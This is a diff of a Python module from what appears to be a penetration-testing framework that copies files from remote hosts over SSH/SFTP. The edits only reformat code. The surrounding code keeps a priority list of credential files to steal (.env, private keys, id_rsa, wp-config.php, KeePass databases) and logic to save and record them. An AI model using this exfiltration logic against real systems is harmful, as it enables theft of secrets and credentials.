@@ -4,6 +4,7 @@ Classification: DESTRUCTIVE — requires operator approval.
 FORGE_SAFE_MODE=1 blocks all exfiltration. Data saved to downloads/.
 Memory-safe: streams files in chunks, never loads full file into RAM.
 """
+
 from __future__ import annotations
 
 import hashlib
@@ -24,8 +25,17 @@ _EXFIL_DIR = Path("downloads") / "exfil"
 
 # File patterns to prioritise for exfiltration
 PRIORITY_PATTERNS = [
-    "*.env", "*.key", "*.pem", "*.pfx", "config.php", "wp-config.php",
-    "*.json", "database.yml", "secrets.*", "id_rsa", "*.kdbx",
+    "*.env",
+    "*.key",
+    "*.pem",
+    "*.pfx",
+    "config.php",
+    "wp-config.php",
+    "*.json",
+    "database.yml",
+    "secrets.*",
+    "id_rsa",
+    "*.kdbx",
 ]
 
 
@@ -87,7 +97,7 @@ def exfiltrate_files(
             sha256 = hashlib.sha256()
             with open(tmp_path, "wb") as f:
                 for i in range(0, len(content), CHUNK_SIZE_BYTES):
-                    chunk = content[i:i + CHUNK_SIZE_BYTES]
+                    chunk = content[i : i + CHUNK_SIZE_BYTES]
                     f.write(chunk)
                     sha256.update(chunk)
                     if _SHUTDOWN.is_set():
@@ -98,16 +108,25 @@ def exfiltrate_files(
             local_paths.append(str(local_path))
             exfil_count += 1
 
-            print(f"[EXFIL] {remote_path} -> {local_path} ({local_path.stat().st_size} bytes)", flush=True)
+            print(
+                f"[EXFIL] {remote_path} -> {local_path} ({local_path.stat().st_size} bytes)",
+                flush=True,
+            )
             sys.stdout.flush()
 
-            _record_exfil(eng_db_conn, engagement_id, ip, remote_path, str(local_path), sha256.hexdigest())
+            _record_exfil(
+                eng_db_conn, engagement_id, ip, remote_path, str(local_path), sha256.hexdigest()
+            )
 
         except Exception as e:
             _LOG.error("Exfiltration of %s failed: %s", remote_path, e)
             tmp_path.unlink(missing_ok=True)
 
-    return {"files_exfiltrated": exfil_count, "total_bytes": total_bytes, "local_paths": local_paths}
+    return {
+        "files_exfiltrated": exfil_count,
+        "total_bytes": total_bytes,
+        "local_paths": local_paths,
+    }
 
 
 def _fetch_remote_file(session: Any, remote_path: str) -> Optional[bytes]:
@@ -119,10 +138,12 @@ def _fetch_remote_file(session: Any, remote_path: str) -> Optional[bytes]:
         # asyncssh SFTPClient
         if hasattr(session, "start_client"):
             import asyncio
+
             async def _get():
                 async with session.start_sftp_client() as sftp:
                     async with sftp.open(remote_path, "rb") as f:
                         return await f.read()
+
             return asyncio.run(_get())
     except Exception as e:
         _LOG.debug("SSH fetch failed: %s", e)
